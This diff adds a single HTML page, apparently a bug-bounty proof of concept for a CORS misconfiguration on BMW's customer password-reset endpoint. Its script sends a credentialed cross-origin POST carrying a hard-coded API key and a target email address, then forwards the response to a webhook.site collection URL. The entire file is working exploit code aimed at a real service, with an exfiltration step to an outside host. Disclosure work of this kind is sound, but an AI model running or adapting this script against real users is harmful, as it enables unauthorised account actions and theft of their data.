@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS Exploit PoC</title>
+</head>
+<body>
+  <h2>PoC for CORS Misconfiguration on BMW</h2>
+  <pre id="output">Sending request...</pre>
+
+  <script>
+    fetch("https://customer.bmwgroup.com/gcdm/public/bmwwebcom/DE-de/customers/userAccount/password/reset", {
+      method: "POST",
+      credentials: "include",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "X-C2b-Api-Key": "f195e93a-6bbd-46f3-b762-6cf0bea480b0"
+      },
+      body: "loginId=targetemail%40gmail.com"
+    })
+    .then(res => res.text())
+    .then(data => {
+      fetch("https://webhook.site/your-unique-url", {
+        method: "POST",
+        headers: {
+          "Content-Type": "text/plain"
+        },
+        body: data
+      });
+
+      document.getElementById("output").innerText = data;
+    })
+    .catch(err => {
+      document.getElementById("output").innerText = "Error: " + err;
+    });
+  </script>
+</body>
+</html>
